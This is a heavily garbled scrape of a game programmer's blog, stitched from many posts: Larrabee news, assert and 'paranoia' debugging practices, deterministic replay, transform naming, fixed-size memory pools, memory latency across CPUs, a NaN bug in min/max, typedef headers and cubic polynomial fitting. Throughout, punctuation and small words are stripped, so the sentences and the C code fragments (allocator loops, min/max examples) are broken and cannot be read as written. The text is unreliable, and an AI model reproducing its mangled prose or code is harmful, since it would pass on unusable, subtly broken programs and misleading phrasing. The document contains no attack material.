wwwgooglecomsearch qlarrabeeintel amusing seeing people intertubes discus sucky conventional rendering happy report even remotely accurate also inaccurate perception big boy finally along keeping quiet taking care business said talented people joining larrabee crew intel employee external adviser includes name people heard also many awesomely smart people nt chosen quite visible immensely exciting bouncing idea frankly used working within confines conventional gpu pipeline barely know start new flexibility going lot fun figuring area explore first work within existing game framework thing require longerterm investment tool infrastructure new rendering technique nt much use artist ca nt make content expect hear much much later try stop must focus getting thing done plenty time public discussion algorithm suchlike future thanks attention need engage larrabee cloaking field return irregularly scheduled blog gave talk stanford university recently reminded make list link public larrabee info ishttp wwweelpigotdnsorglarrabeelarrabeehtml stanford talk fun video available link page watch say um er lot usually better small auditorium knew surprising number audience forgot put public presenter head recent medium attention cancelled far first version still need work lot software write turn bunch core something look like gpu window ship public take lot time wo nt ready hoped ship year nearly dramatic story seen people love sensational headline never inside medium attention taught need remember old adage never believe anything read internet one paper turn useful someone asked license rather legal department asked forced find suitable license annoying real one course nt dick nt think lawyer liked one much browsing http wwwopensourceorglicenseshttp wwwopensourceorglicenses finding lot wordy annoying one settled mit license without middle paragraph requires attribution pushy short sweet objectionable thing lawyer seem need talk cap lot maybe make judge like something whatever go good stuff people bit random list stuff tried organise nice narrative made mess instead write bunch word assert recent discussion altdevblogaday revealed question assert many possible answer lot people different view sometimes people get hung word assert mean let list bunch useful tool like without using word chris hargrove wrote great taxonomy going steal premortem immediately fatal ignorable fundamental assumption engineer disproven need immediate handling requires discipline part engineer add situation actually nonfatal rule thumb crash would almost certain happen anyway due condition worse making assert error probably fatal soon necessarily immediately basically marker f cked state might limp along bit assume nothing game continues ugly red number get displayed onscreen many encountered people send screenshots bug point red error count blame accordingly savegames disabled point make error effectively permanent also deliberately violate tcrs soon error encountered order ensure party publisherdeveloper chain aware bad thing error technically ignorable everyone know might buy little bit borrowed time small step away immediatelyblocking nature assert sometimes small step big impact productivity warning used something bad caught fine game state still okay however might fine future want save headache fix sooner rather later great content problem also displayed onscreen yellow number near red error number keep around triage utility called question crumb metacategory large number verbose informational breadcrumb category must explicitly enabled clutter everything obscure stuff matter note occurrance certain error automatically enable relevant category crumb detailed information aforementioned f cked state provided limpalong timeframe chris actually called first one assert want use generic term tend use actual assert macro first three also put log also nt differentiate first two hard predict fatal let card fall sometimes put text error warning something like probably fatal cause strange effect generally premortems something like pthingie null like idea big redyellow number screen never done idea well worth stealing fixing assert basic assert runtimes give way heavyhanded noisy nothing else got whole bunch problem fail get dialogue box drive nut want go straight debugger hit breakpoint someone running without debugger eg artist want slightly helpful message machine detonates shower spark asserts really warning sometimes want warned every time hit especially someone else wrote nt understand warning also includes thing like object went faster speed sound player intersects ground warning want know probably persist frame hopefully fixing thing make assert usable rough order easy hard debug mode assert becomes debugger breakpoint eg inlined code subroutine pop stack release build dialogue box invent assertonce exactly say tin assert useful text message release build minimum tell user poke designer artist ca nt immediately find coder poke assert simply increase noise worse useless assert advisory asset eg texture poweroftwo always say asset refers point telling artist texture square nt say one even better tag asset creator name assert say asset created ideally asset made within last day big deal month old fix shit also help build know currently running found helpful people could easily ignore warning trying something wanted know stuff nt immediately changed conversely checking change want know screwup people people nt coder tend ignore warning fact life clearly remember listening two artist running daily build one said oh replied oh another ignoreall click crash happened evening removed ignore button assert dialogue made something slightly le trivial brush aside eventual solution log every assert warning somewhere useful analysed later ghetto way log consistentlynamed file hdd public directory person charge build hi periodically scraped work machine file threw database found common andor oldestoccurring asserts went bitched people fixed surprisingly effective elegant way would connect bug tracking system autofile bug simple thing first glad hassle dealing prompt right thing eventually give idea aggressively use asserts picked c file private project mostly gameplay whitespace line curly brace line comment tend write comment people especially complex code line asserts case since file nt deal external asset almost premortem type like pointerchecking sanity check like sensible range value leaving actual code roughly ratio code comment asserts feel right another file similar degree paranoia define paranoia set shipping build normal developmentdebug debugging something tricky evil thing like memory scribbler like various debug defines except value important expensive debug check happen higher paranoia level also somewhat orthogonal enable paranoia without using debug eg trying find bug show release standard asserts paranoia mallocfreenewdelete thing like zapping data paranoia expensive check go paranoia really expensive one paranoia idea write code freely hurl asserts debug check around like crazy framerate start suffer nt remove check wrap older one higher higher level paranoia bug standard asserts nt find raise paranoia level every eg checkin run higher paranoia level well class similar group functionality method called check general consistency check object value lie sensible range pointer object still exist meant pointer back etc function nulled header unless paranoia also function paranoidcheck call check paranoia general call check creation destruction changing pointer relationship eg character pick weapon call weapon character make sure nobody else weapon character nt already weapon hand actually exist paranoidcheck sprinkled anywhere even slightest suspicion may problem unless paranoia nt anything also paranoia game tick call check every object entire world really expensive test eg checking every single pointer every single object every single object processed every time put paranoia basically setting nasty bug find happy leave running hour frame exchange assert fire show also put expensive code inside check method hidden behind paranoia deterministic playback found powerful debugging tool make sure game deterministically replayable note mean singleplayer mode replayable machine recorded build talking debugging gameplay feature tricky time basic step decouple gameplay tick processing machinedependent thing like rendering good sort reason write post one day record player input log make sure random number pseudorandom store seed log careful using pointer address change run run data get subtle thing eg using pointer hash table traversing every object hash table get different traverse order run run record debug level log different optimisation level produce different numerical result another reason keep paranoia distinct debug though still get sideeffects screw thing rendering mode key replay game fast possible way fastforward time investigating every often eg gameplay tick autosave current game state use rotating series save append log previous autosave flush log give bunch cool thing easy reproducibility bug even one nt get noticed many frame ai bug get bit map henchman trying stab someone pineapple instead knife etc get bug backtrack autosaves watch objectcharacter question find bug originally manifested saved much time past worth one feature make sure saveload work amazing easy break saveload realize quite way constant use also encourages people keep fast stress test always big pool saved game player action replay whenever feel nervous build integrity course get obsolete gameplay change still useful folk connected gameplay eg graphic sound etc mitigation catastrophic bug machine instability eg dodgy driver final released version people always resume lost minute play far le angry asking support easy demo recordplayback especially useful want fly camera cinematic location engage highquality rendering mode bell whistle print resolution run second per frame another handy tip game load autosave first copy somewhere else unique name otherwise debugging something autosave bit easy autosave frustrating also rotating sequence autosaves covering least half hour play place bug happened long time noticed unit test read ton stuff unit test great agree theory practice big thing say write ton code maybe year fix extra bug really hard pill swallow result never managed get codebase significant size use ca nt even persuade use much result nice idea nt seem work practice need something almost effective without big chunk upfront work like thing like asserts everyone know scary write right alongside code used properly powerful documentation selfchecking weapon trick gradually grow thing amount unit test without actually sitting saying right today going spend four hour writing code good day nt anything good asserts scattered code aggressive check paranoidcheck call code got goodness unit test nt really need fancy nt actually checking feed input game game selfchecks many case unit test might loading replaying savegame log time find much easier justify writing unittest would caught bug actually found whereas writing unit test bug might never create mentally draining find far easier write ton asserts selfcheckers instead go along tomf emailme show blog entrieshttp eelpigotdnsorgblogwikihtml link bloghttp eelpigotdnsorgblogwikihtml r feedhttp eelpigotdnsorgblogwikixml main websitehttp eelpigotdnsorg blog roll wifehttp eelpilivejournalcom canishttp wwwlycanthropeorgcanis mark bakerhttp technobubbleinfo dave moorehttp onepartcodecommain wolfgang engelhttp diaryofagraphicsprogrammerblogspotcom jake simpsonhttp blogjakeworldorg rich carlsonhttp wwwdigitaleelcomblog ignacio castañohttp castanoludiconcomblog directx faqhttp tomsdxfaqblogspotcom whatisthisthing tiddlywiki mainhttp wwwtiddlywikicom lot complex transformation various coordinate system recently crystallised practice always done halfheartedly naming transformation nt name right get amazing bug take day figure name right consistently actually quite difficult make mistake reminded aside blog post fabian giesen didhttp thought expand bit way absolutely read series three post clear misconception even experienced coder naming convention use underscorenaming camelcapsnaming work fine well course transformation typically represented matrix though variety thing eg euler angle offset quaternion offset dual quaternion however usually operation apply transformation position vector righttoleft multiplication thing seems majority vec newvec oldvec one apply transformation another transformation trans newtrans associate freely vec newvec oldvec oldvec however commute trans vec vec trans second term nt even mean anything wo nt compile statement convention fabian covered lot detail naming transformation convert vector value one space another typical transformation talking graphic one describes position orientation object world transformation turn position model space artist designed art package position world space ready rendered reason become clear want name thing format xfromy sort transformation named worldfrommodel also name vector way get expression look like vec vertexworld worldfrommodel vertexmodel note naming slightly counterintuitive trip worldfrommodel move position modelspace worldspace normally call orientation position model world instinctively think would named way around least consistency trick going talk absolutely need word world first model second remember way think fine find help think transforming vector start origin model coordinate end world coordinate place position model world naming scheme nice immediately check consistent math checking nearby part name shown highlight vec vertex world world model vertexmodel also applies concatenating transformation example saw vec vertex world tankturret tankbarrel tankbody tankturret world tankbody vertexbarrel wait minute mess none part near match clearly whoever wrote got order transformation wrong written vec vertex world world tankbody tankbody tankturret tankturret tankbarrel vertexbarrel match nicely fact given collection matrix one valid way combine ca nt make mistake course normally concatenate transformation single combined one transform vertex result get sensible name intermediate transformation taking first part leftmost particle last rightmost particle trans xxxfromyyy worldfromtankbody tankbodyfromtankturret tankturretfromtankbarrel first part trans world fromyyy world fromtankbody tankbodyfromtankturret tankturretfromtankbarrel last part trans worldfrom tankbarrel worldfromtankbody tankbodyfromtankturret tankturretfrom tankbarrel course vertex vertex world world fromtank barrel vertexbarrel easy foolproof also help reverse need find specific transformation know transformation combine order need invert invert transformation swap end name say transformation worldfrombody worldfromturret need know bodyfromturret well ca nt stick two transformation together either way around part match must need invert one taking inverse transformation swap end one invert one combination everything work trans bodyfromworld worldfrombodyinvert trans bodyfromturret bodyfrom world world fromturret notice result take first part leftmost word body second part rightmost word turret sticking closely sort naming scheme minimises confusion mean fairly simple check math checking grammar another series post discus thing really common wellknown inside game industry nt seem welldocumented outside may useful people learned code starting larger project always load different way thing always right answer feel free tailor specific situation game world mechanic far enough along trying bigger world lead two obvious problem memory performance bunch neat algorithmic stuff write good time still annoyingly poor particular loading saving even quitting game annoyingly slow quitting game took second large world even release build could answer memory allocation lion share time c runtime crt debug heap every time run debugger release debug build hook allocation thing like fill new allocation free check nt scribbled end great catch otherwise really hardtofind bug cost performance turn really need prefer finding evil scribbler helping find uninitialized data really useful find performance hit also emphasizes way much memory management burning performance much better know problem early hide discover late day indeed help find problem let fix rather wait code complex something fundamental changing memory allocation strategy terrifying contemplate turn reason much memory allocation freeing due two pattern crop many time many project really surprise see always knew address eventually good time fixedsize block pool aka memory stack every object game tree puddle water rock single struct called mapobject special object need specialized storage data dwarf train pointer optional data structure hanging mapobjects vast majority thing world share one structure course thing move around tree grow fruit fruit fall ground becomes seed tree rain fall form puddle puddle merge form water flow lot allocation freeing structure really need return data general heap time object comprise majority memory game unlikely need ton memory point nt also ton object world solution keep special pool fixedsize object mapobjects lot name call memory stack free item kept lifo stack word pool heap stack arena theory specific technical meaning practice everyone mean completely different specific thing even dusty old textbook disagree nomenclature complete mess first item free stack pointed global inside mapobject class static mapobject gpfirstfreeobject free mapobject instead calling free delete instead push onto stack like mapobject gpfirstfreeobject gpfirstfreeobject reuse first byte nowunused mapobject memory pointer next item free heap allocate new mapobject usually reverse return top stack move topofstack pointer linked list gpfirstfreeobject null allocate mapobject pobj gpfirstfreeobject assert pobj null gpfirstfreeobject mapobject gpfirstfreeobject detail allocate vary according taste right greedy grabbing another chunk poolblockalloccount attempt able recover data future actually free change later since hidden rest code full allocation routine follows gpfirstfreeobject null char pmemblock char malloc sizeof mapobject poolblockalloccount gpfirstfreeobject mapobject pmemblock int char pnextblock pmemblock sizeof mapobject mapobject pmemblock mapobject pnextblock pmemblock pnextblock mapobject pmemblock null end linked list free object gtotalnumobjectsallocated poolblockalloccount debug information mapobject pobj gpfirstfreeobject assert pobj null gpfirstfreeobject mapobject gpfirstfreeobject note recovering memory later tricky need look chunk object search free stack find unlink actually free chunk case far effort willing put right unlikely need recover memory could also add debugging feature like crt write pop new mapobjects free stack write push back free stack nt scribbler problem mapobjectrelated code seems lowpriority later need help four way never free memory perf hit gone malloc call happen start day rather every turn perf almost gone malloc big block time called far le frequently malloc chunk memory extra memory used inside allocator track block fewer allocation mean much le overhead le total memory used given map size nice win highly dynamic scene flood rain landslide lot mapobjects created freed get decent perf win also larger map memory saving handy every little help technique used fixedsize block usually separate heap size block thing game might apply method later one standard thing everyone us first game particle system since number bounce dramatically frame pretty tiny nt particle game yet total pixelporn fail know yet come turned much bigger win came second common data structure revisiting resizable array talked post resizable array without using stl use place great specific place use hex world list pointer mapobjects hex hex many object example single hex contain tree dwarf log wood puddle water time hex storeroom contain ten hundred object need resizable list pointer thing hex nt contain multiple thing contain either nothing bit dirtrocksand bit water remainder contain maybe two three item noted post resizable array reserved size used size different pointer allocated list look like template class class arbitrarylist int ireservedsize current reserved size list int isize current size list pt list case mapobject ie pt point array pointer memory pt reference need separate allocation resize need bigger array separate usedsize reservedsize mean start array pointer size object move one hex another although used size might change resizing array remains pointer long nevertheless every hex map anything arbitrarylist object inside also allocated block memory pointed pt call allocator memorytracking overhead usual case get space pointer change made reduce cost small amount space prereserved inside arbitrarylist structure gain one new member template class class arbitrarylist static preallocsize pt may point start int ireservedsize current reserved size list int isize current size list pt list static array new place store data list small previously start day ptnull ptstatic ireservedsizepreallocsize almost listmanipulation function nt know care indirect pt usual ever need resize allocated list either need instead always calling free pt first check ptstatic nt try free memory allocating space new list new size preallocsize le instead allocating new memory point pt back static win grew every list game sizeof preallocsize nt waste memory well really time use list least one item list actually empty already minimum size allocate list avoid constant reallocation almost list previously array size allocated separate chunk memory instead inline whenever allocate memory memory manager need reserve header track allocation extra overhead time actually waste memory list larger preallocsize point static array real allocated list pt pointing uncommon case course large list also large number thing hanging list overhead static array case size pointer nt significant common case improved bunch way allocating object containing arbitrarylist single allocation two faster similarly freeing object one free two avoiding list allocation mean avoid memorymanager header overhead arbitrarylist inside something us fixedsize object pool see malloc free call whole chunk get pushed popped stack free object lot extra enhancement make zerosized list common thing static array much memory hit could combine two technique instead list static array inside fixedsizeblock heap sizeof preallocsize list three state ireservedsize pt null ireservedsize preallocsize pt point fixedsizeblock heap ireservedsize preallocsize pt point actual allocated memory alternatively could hide ireservedsize inside static block since never need save byte make logic debugging trickier however realize good memory manager also thing like fixedsizeblock heap internally nt get complex replicating work probably done far analysis memory allocation pattern reason simple thing like two technique implicit semantic knowledge compile time general allocator ca nt get take assumption never needing aggressively free mapobject memory general system ca nt end result bit work large map roughly halved memory footprint pretty dramatic time taken delete everything world dropped second still sound lot using generic routine maintains consistency world removing every single object obviously waste destroying entire thing moore law even properly stated wonderful thing code get faster faster allows u stuff stuff le effort one way use le effort use higherlevel language let u amount coding quicker time market handle complex project great much moore law implies doubling every month actually get going use five system know pretty well zx spectrum atari pentium powerpc inside xbox latest nehalem number might approximate place various reason eg memory crap going focus integer performance keep playing field level zx spectrumhttp enwikipediaorgwikizxspectrum launched zilog first computer pretty awesome time certainly launched lot british coding career simple instruction needed around clock execute cache atari sthttp enwikipediaorgwikiatarist launched though lateadopter got mine month amiga came going call first year cheap enough become common launch first real game machine version motorola simple instruction also took clock execute cache pentium remember consciously buying first pc point remember turbo button toggled stupid display front panel cheesy memory specific machine hazy changed often work home point clearly must owned pentium description however reason pick based first larrabee core term integer performance nt change much apart frequency know well issue two simple instruction load store arithmetic per clock going choose first version data point released widely available builtin motherboards optional external informed memory latency around clock motherboards though never measured xenon powerpchttp enwikipediaorgwikixenon great core think would run twice fast designed clocked half speed purpose going ignore gripe like core focus reasonable peak throughput released late dualissue main memory latency around clock rather high even time memory request go via gpu also encryption hardware adding bit latency nehalem latest released intel cpu architecture westmere shrink architecture sandy bridge yet officially released nehalemhttp enwikipediaorgwikinehalem capable sustaining execution simple instruction compare properly core list big shared data helpful anandtech testhttp say nehalem clocked main memory latency core clock think number really low compared xbox right keeping low big focus team ok trip memory lane get u name year mhz cpi mips mem latency latency n xenon nhm mhz clock speed cpi clock per instruction mips million instruction per second basically got instruction per second memory latency improved growth instruction speed per year growth memory speed practical processing power grown even faster thing like bit floating point simd etc ignore able use power help u write complex program run program faster far go language took two common operation member access object function call looked many instruction memory access likely miss cache took three different language plain old c standing assembly oldest two cpu c multiple inheritance ducktyped language python came following instruction memory miss member access c c mi ducktype function call c c mi ducktype instruction count ducktyping basically guess turn nt affect answer much anyway also sure dependent memory access ducktyping could nt actually find lowlevel description common operation saying hash table nt narrow much anyone actually know specific algorithm used common ducktype language ignored fact bytecode run interpreter rather native code let know number assumed language choice first three cpu c xenon c nehalem ducktyping table showing thousand operation question per second speedup relative member access function call c c c xenon c nhm dt got perf member access perf function call sticking language clearly see using multiple inheritance xenon bad idea pretty large memory latency suffered according admittedly rather pessimistic number absolute performance actually decreased using plain c pentium reflects lot people actually see nt watch nehalem much better memory latency save u right well switch ducktyped language time nt actually help much function call bit faster overhead actual call pushing stuff onto stack etc took significant time older cpu nehalem gobble ca nt get rid extra indirection mean significant difference accessing member calling member function interestingly implies performance barely moved going c pentium python nehalem really true taking code wrote porting python mean run basically speed course bad clearly approximated wildly simplicity make point nehalem gigantic cache combined cache large entire addressable memory per core distributed fourcore chip actually total lot memory access manage hit cycle away nevertheless point still memory speed scaling slowly compared common perception processing speed even though know sometimes lose track relative magnitude assuming new feature slight performance hit recent data oriented design movement folk like mike acton basically trying remind people extra performance contingent cache working well even code think minor processing load start becoming significant performance hog miss cache time chickenscratch number show sophisticated language feature basically becoming mainstream fast processing power increase warning extreme speculation ahead might surprising though size job limited thing like say amount complexity player brain cope minute maybe happening amount gameplayrelated code happening per minute asymptotically approaching various limit find use extra power write code higherlevel language increase productivity iteration speed robustness bad thing confined code inherently limited human end controller thus following moore law cause problem area code adopt language either coder choice language productive interoperability gameplay code opposed using two different language ducttaped something like swig acton dod folk get ranty difficult recover performance performance tuning used understand focused traditional kernel area high number crunching graphic animation sound raycasting etc even certain hot function see profiler sit stare week code ever function call every member access none show well traditional profiling tool nice cache unpredictable temperamental beast incredibly sensitive heisenburg butterfly effect traditional method game production write thing run low rez simple asset pretty much ignore fact thing run slowly time unoptimized numbercrunching kernel assume last quarter performance ninja optimize hell quadruple speed instead happening development game half execution time spent kernel ninja come solve half get modest framerate boost profile flat pancake idea even start looking perf ninja screaming sobbing level designer speed python hash table lookup volker schoenefeld took pity pathetic math knowledge used know stuff back university atrophied sent link excellent tutorial paper done sh math behind probably best place start paper http heimcottodevolkerprosempaperpdfhttp heimcottodevolkerprosempaperpdf also flipcode entry http wwwflipcodecomcgibinfcarticlescgi wwwflipcodecomcgibinfcarticlescgi source go http heimcottodevolkerdemotgzhttp heimcottodevolkerdemotgz many thanks volker well never rain pours ok true reinvention time sort coinvention sony announced edge library recently snazzy new vertexcache optimiser people gdc asked whether algorithm idea nt written anything age knew dave etherton rockstar ported algorithmvertex cache optimisation really good result say faster think compared whatever random ordering get maxmaya anyway edge one actually version kcache algorithmhttp wwwecserpiedulinkcachereorder tweaked refined jason hugheshttp wwwdirtybitsoftwarecom particular quirky feature posttransform cache rsx graphic chip turn similar broadscale algorithm slightly different focus tune particular cache try generality across range hardware would academically interesting compare contrast two however probably achieve close enough ideal acmr ensure vertex transformation going bottleneck really need remember ordering triangle vertexcache optimisation want reorder vertex buffer using vertex roughly linear order extremely simple exactly algorithm expect scan tris first time use vert add vb much win case triangle reordering mucky foot production ltd game company guildford mile south west london guildford used heart uk indie game development gone bit quiet worked late late went pearshaped company folded worked fun game joined closing stage urban chaos pc job porting dreamcast fabulous machine work fun game little random place full character knowledge darci still gaming world female black cop protagonist joined startopia pc team took graphic engine still play today http wwweelpigotdnsorgstartopiastartopiahtml fantastic little computer people game available amazon day blade ii mainly engine side thing great game pleased way graphic turned managed put lot nice tech autogenerated normal map slidingwindow vipm mesh almost every asset streamed disk mesh texture sound physic hull started two game parallel new crossplatform engine headed got year development everything collapsed bit shame really engine shaping fairly well year tried document technique used click streaming vipm tag righthand menu story fun bug challenge reader twofold first spot bug give secret away title given huge clue already filled know dread giggle second pragmatically interesting working programmer figure one took several hour narrow fix rather immediately obvious bit standard single stepping sprinkling asserts standard bug triage usually work pretty quickly context simple image processing highlevel flow read rgb image convert yuv simple processing convert srgb quantise lowerbitperpixel format dequantise display verify worked result image kinda right quantisation jumpy contrast image tended go unpredictably expected slowly change dynamic range visible scene changed bright dark thing came view meant actually happened even tiny change input caused large change quantisation quality first thing tried disabling simple processing part nothing normal state anyway special effect result narrowed part quantisation scanned image found min max channel nt set min max value channel everything stable though obviously quantisation nt giving particularly good result happens code actually step pixel yuv conversion processing found minmax value ie max fltmax min fltmax int imagesize pix image pix toyuv pix pix processing pix pix torgb pix gamma powf pix max max gamma max min min gamma min stuff use minmax quantise image note use fltmax fltmin bitten well go look value think use fltmin almost always bug maybe go grep codebase check anyway bug well debugging bunch input image showed pretty sensible value min max coming nt horribly broken still unstable investigation showed quantisation clamp value outside range min max code safety net nt needed case singlestepped loop bunch representative pixel seemed working expected yet min max clearly producing right answer end could possibly code complex started worry memory scribbler playing value min max stack terrifying thought happened pick image first pixel fairly primary colour let say red get get converted yuv uintuitive triplet number back rgb conversion yuv quite perfect hey welcome floating point got back like easily close enough image work especially going quantise result convert srgb standard method raising number power strictly correct purpose close enough hey fellow floatingpoint nerd spideysense tingling yet good first part take long track would expect end result surely would spotted almost immediately clearly fun come familiar floatingpoint arcanum let explain nt negative tiny bit enough raise negative number fractional power like result undefined powf give back result called nan stand number floating point value nt number value say screwed idea example come dividing zero zero infinity sensible answer practice normal code also regard infinity inf category nan theory inf slightly betterbehaved practice rapidly turn nan since infnan infinfnan still usually sign buggy unstable code nan usually spread data like wildfire unless deliberate filtering ca nt easily get rid nannan get one nan almost operation another value produce nan operation cause nan infect data one respect maddening way start rely see nan output function know somewhere function screwed place generate nan check first square root divide power function thing like normal addsubmul ca nt make naninf without first fed naninf nt see nan result probably fine one ever got generated usually pretty hard get rid hang around intuitively happened took power negative number got nan oops bad course taking min max range number one junk clearly also junk stage produced utter gibberish would tracked really quickly right course except nt happen min max result nt junk totally plausible value image correct value hardcore floatingpoint nerd laughing ass think whole story promise still subtlety come rest lem splain said nan nt usually keep quiet stay data infect spread one notable exception well guess two function min max fact lot lot version min max subtly different thing presence nan could write long deeply nerdy post variety spent day figuring devising larrabee instruction set le three variant good thing standard many detail nt really matter coder aware standard lessthanequalsgreaterthan comparison nan return false except equal true ask question x greater nan answer literally idea nan nt even know sign additionally two nan exactly bit pattern nt equal either number even strange one like infinity nt know ok burning question min max implemented turn fairly obvious way result x x people nt like operator great fan turn problem get result traditional statement ease discussion let expand macro also change loop scalar rather vector give small input image float image float max fltmax float min fltmax int float pix image float gamma powf pix max max gamma max gamma min min gamma min gamma ok well pretty simple decent coder able go figuring various possible value min max might produce example also compiles could run print min max try figure get result save bother answer nerdy determine many layer wtf cause first quick scan would expect something like max already pointed raising power produce nan next guess expect max min end nan right perfectly reasonable guess wrong would far quick track would nt written post ok also told special min max indeed definition explicitly discard nan giving answer one number said floatingpoint nerd probably thought got solved long ago expect nan ignored expected result would subtle bug well probably subtle never even seen really really close actual range number imageprocessing especially quantisation close enough fine ah nt min max awesome thing face nan let singlestep first loop easy problem second loop surprisingly large result gammacorrecting far good third loop gammanan obvious problem max max gamma max gamma min min gamma min gamma nan comparison nan return false new value max gamma ie maxnan happens min well expecting alright data screwed thing happens min nan world disaster game output junk wait answer nt junk eh somewhere nan vanished let next loop gamma min maxnan max max gamma max gamma min min gamma min gamma nan comparison nan return false new value max oh actually nan vanished min last loop expect result gammacorrecting think overall behaviour effect specific way coded nan discarded long last pixel nt nanproducer get minmax range value range value last nan subtle nan due slight math wobble certain colour rgb yuv rgb conversion pop random place come go unpredictably every time entire chunk image suddenly got ignored added purpose minmax quantisation contrast would pop finally explains everything worth pointing happened specific way min max happened implemented library using left exercise reader consider result would equally valid think completely identical max gamma max gamma max min gamma min gamma min number possible alternative using sse minmax assembly intrinsics oh actual bugfix solution simple clamp result yuv rgb conversion nice chunky comment block shortly leaving intel working architecture known variously smac larrabee mic knight xeon phi enormously rewarding absolutely company planet take people idea use change computing extent discovered really bigcompany sort person seven year one project personal record time move michael abrash asks want come work wearable computinghttp really one correct answer answer gave seven year ago asked idea new instruction immensely proud achieved almost achieved larrabee think architecture clearly blueprint future knight corner great chip really excited intel able show everyone start shipping sad able part know team go refine architecture also proliferate concept generalpurpose computing next year going really exciting different architecture battle one way sad leaving world hardware instruction set design stake high pressure looking forward able go back game coder cranking pixel maxing hardware given significantly fewer meeting start look please try remember surname e approximately three time many forsyths london phone directory forsythes exactly uncommon would nt mind much people nt add spelling name saying eff oh es tee aych write e ask oh e well big silent bit could easily said e nt suddenly forget anything going write chequereceiptpermit nt http notepadplussourceforgenethttp notepadplussourceforgenet like notepad better wordwrap right bunch neat bracketmatching option whole bunch useful stuff nt played yet launch instant nt replace good custom text editor ace hacking text file arbitrary language xml etc nt spare hour visual studio start going use emacs pervert know going get endless email pedantry subject brief round background nt need know geeky interest nyquist ratehttp enwikipediaorgwikinyquistrate two meaning interesting one limited bandwidth medium absolutely ca nt represent signal frequency twice medium put graphic term certain number pixel screen limited bandwidth medium absolutely ca nt represent signal texture twice size point even trying also nyquist frequencyhttp enwikipediaorgwikinyquistfrequency say subtly different thing want represent signal certain frequency sample twice frequency avoid aliasing however actually relevant texturing generally signal real life much higher achieved pixel display concerned give reasonable representation signal far beyond capability hardware choose hardware completely represent signal people also talk nyquist limit appears informal term usually referring much information pump system without looking bad different thing two talk theoretical limit practical one ever game graphic academia give guide set limit realworld tend make large assumption go look good nice know case real basis approximation seem work fine practice handy list rule use instantly decide someone idiot coder way decide tell list rule offended idiot give useful argument rule idiot thoughtful misguided agree rule instantly sheep argue agree true disciple handy classification system since completely eliminates possibility people might smarter list grow time chance anybody agreeing entire list therefore tends towards zero thus number idiot world grows every update fear blog double precision place game think need double precision either need fixed point nt understand algorithm matter precision euler angle evil unless actually modelling tank turret even evil happen evil hardwired every tank turret try spread teh strictly necessary angle general evil time feel urge use angle vector formulation likely robust fewer transcendentals branch mean time sincostan inverse inside inner loop need finish derivationshttps ca nt write assembly code writing danger project coder try something bit lowlevel understand writing think remember precedence rule beyond right also nobody else remember code buggy unmaintainable use bracket opengl crazy directx flaky transient confusing politicallymotivated crazy scene graphsscene graph say useless complex occam razor make mincemeat premultiplied alpha right way blending still lerp blending year date get help converting pipeline premultiplied alpha part know love loose octrees right really useful thing used around ten year game twice long raytracers well doofi intel patented http wwwgooglecompatents wwwgooglecompatents filed well common use two year publication game programming gem thatcher ulrichhttp wwwtulrichcomgeekstuffindexhtml wrote definitive article title article fairly obvious one loose octrees exactly difficult google investigating patent application subject indeed top page found thatcher understandably thrilled either may entryhttp wwwtulrichcomrantshtml normally simply avoid reading patent entirely try pollute anyone else brain incredible abuse put utterly broken system case late already violated one thought safe nt invented u started programming load people used ton shipped code discussed ad nauseam internet several year since actual publication popular hardback book none stop idiot patenting existing content brain fine sooner someone get sued intel violation sooner patent revoked orbit gratuitous wanton disregard prior art obviousness kevin flynn put slime nt even change name man somebody asked slide michael abrash pixomatic gdc talk day radgametools realised nt online anywhere somewhat temporary place get main sitehttp wwwradgametoolscompixomainhtm someone also pointed dr dobbs journal article pixomatic also available fascinating journey world software renderer even today gpudominated world dead yet getting better nice chap called benedict carter working fun zombiesvsmarines game called plague check blog http plaguelikeblogspotcomhttp plaguelikeblogspotcom download link well get source window exe handy hint concussion grenade really powerful huge range easily kill careful stick incendiary start press key start game start moaning get slow lob bunch molotov around set fire huge forest written python fun home project shush anyway mention got inspiration way fire spread old article cellular automaton physical modelling http wwweelpigotdnsorgpaperscellularautomataforphysicalmodellinghtml wrote back kind enough tell still super happy article particularly way conflates temperature heat energy thing course work fashion fairly explicit need balance enough realism create effect want without much realism hard tweak slow run game physic like real physic fun see old idea made actual enjoyable game course always fun see people get spare time brain full supersecretproject long outside project basically stopped hence blog post long veil secrecy slowly lifting hopefully able talk stuff bit everyone something like header file every project make life simpler typedef signed char typedef unsigned char typedef signed short typedef unsigned short typedef signed long typedef unsigned long typedef signed typedef unsigned one platform andor compiler course note pedantic use signed unsigned default welldefined thing like char use int need something fast poorlyspecified number bit otherwise use one data going save load use data type specified bit size anything else asking trouble woe also reasonable justification since size bool also welldefined people also define something like bool cope older conly compiler nt support bool natively many used semiofficially support bool also though far le confusion float double consistent across platform edit reaven khali pointed boost header file boostcstdinthpphttp nt personally like use end making implicit ints signed easily typedef name preference people prefer even shorter name like etc still leave boost header figure compiler config problem edit mark baker hi mark pointed header standard lib file wikipedia entry stdinthhttp enwikipediaorgwikistdinth appear use naming convention accident sure nt know pro con using stdinth version versus boost version nt want people email long past caring codestandard war especially boostisawesome v boostisthedevil one writing option edit sean barrett solves problem solved one well sophisthhttp nothingsorgstbsophisth brian hook also solves problem poshhttp important thing code us sort reasonablynamed standard nt littered unsigned int struggle searchandreplace later exactly convention header use define easily changed later change platform nt stop think cut npaste top snippet code right start using type go investigate changing later work recently dealing fitting polynomial curve set point normally job reach mathematica heavymath package use right incantation would magic math stuff spit right answer problem nt really understand question nt really understand solution certainly hard thing like implement runtime code explain nt work case like least try highschool math skill reaching math wand question function bunch data point badlycontrolled need approximate nice simple polynomial put something like pixel shader keep concrete say cubic quite happy stick control point noisesmoothing approximation process eye human good help find right number put shader code shader cubic polynomial look like b x c actually want ultimate efficiency write way express fundamental fused multiplyadd nature u rule exactly sometime pay write specifically x b x c x ok nt help four point want curve pas find b c intuition say solution four constraint four value q four constant b c solution seen many people throw hand stage problem like say mathematician hard except actually difficult math fact plenty mathematician make mess precisely know much math start use higherorder sledgehammer crack fairly simple nut soon includeing sort library legally intimidating license let cat bag told nt require anything resembling graduate math let smash forehead like dirty stubborn hacker truly stubborn way approach write four equation use highschool math solve simultaneously adding subtracting stuff b c b c b c b c um multiply everything er oh going mess think maybe stubborn nt need look like wrong path let see solve simpler case see help u well zero oh life get much simpler first equation b c well easy except probably nt zero reformatted polynomial relative zero ie rewrite b c using instead x make extra term vanish nt changed thing could probably multiply find old new found new b c nt found yet still looking ugly though neat trick multiplying thing nt like p value wrote polynomial like clearly still cubic polynomial theoretically convert back one want put shader long find nice thing set second third fourth line zero get fairly simple thing solve therefore best symmetrical nt really figure four line obvious extension first symmetry often hint right track ok get b c well multiply gather term together constant x really hard still use lot symmetry help taking 